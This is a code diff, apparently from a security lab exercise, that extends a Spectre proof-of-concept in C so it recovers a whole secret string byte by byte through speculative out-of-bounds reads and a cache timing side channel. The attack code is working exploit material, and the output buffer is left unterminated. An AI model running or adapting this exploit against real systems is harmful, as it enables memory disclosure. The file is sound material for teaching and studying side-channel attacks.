@@ -5,7 +5,7 @@
 #include <stdint.h>
 #include <unistd.h>
 
-#include <unistd.h>
+#include <string.h>
 
 //  Windows
 #ifdef _WIN32
@@ -97,34 +97,34 @@ void spectreAttack(size_t index_beyond)
 }
 
 int main() {
-  int i;
-  uint8_t s;
-  size_t index_beyond = (size_t)(secret - (char*)buffer);
-
-  flushSideChannel();
-  for(i=0;i<256; i++) scores[i]=0; 
-
-  for (i = 0; i < 100; i++) {
-    printf("[%d] - *****\n",i);  // This seemly "useless" line is necessary for the attack to succeed
-    spectreAttack(index_beyond);
-    usleep(10);
-    reloadSideChannelImproved();
-    usleep(70000); // works with the following for with int max = 0; and i=0 in the for
-  }
-
-   //int max = 1;
-   //for (i = 1; i < 256; i++){
-     //if(scores[max] < scores[i]) max = i;
-   //}
-
-// the following one works commenting the usleep(70000); above
-  int max = 1;
-  for (i = 1; i < 256; i++){
-    if(scores[max] < scores[i]) max = i;
-  }
-
-  printf("Reading secret value at index %ld\n", index_beyond);
-  printf("The secret value is %d(%c)\n", max, max);
-  printf("The number of hits is %d\n", scores[max]);
-  return (0); 
+	int k=0;
+	char secretFound[strlen(secret)];
+	int e=0; // initialization of the array
+	for(e=0; e<strlen(secret);e++)
+		secretFound[e] = '.';//initialize all elements as point
+	for(k=0; k < strlen(secret); k++){
+	  int i;
+	  uint8_t s;
+	  size_t index_beyond = (size_t)(secret - (char*)buffer) + k;
+	  flushSideChannel();
+	  for(i=0;i<256; i++) scores[i]=0;
+	  for (i = 0; i < 100; i++) {
+	    printf("[%d] - *****\n",i);  // This seemly "useless" line is necessary for the attack to succeed
+	    spectreAttack(index_beyond);
+	    usleep(10);
+	    reloadSideChannelImproved();
+	    usleep(70000); // works with the following for with int max = 0; and i=0 in the for
+	  }
+	   int max = 0;
+	   for (i = 0; i < 256; i++){
+	     if(scores[max] < scores[i]) max = i;
+	   }
+	  printf("Reading secret value at index %ld\n", index_beyond);
+	  printf("The secret value is %d(%c)\n", max, max);
+	  printf("The number of hits is %d\n", scores[max]);
+         //save the letter to the array
+	  secretFound[k] = max;
+	}
+	printf("The secret is: %s\n\n", secretFound);
+	return (0); 
 }
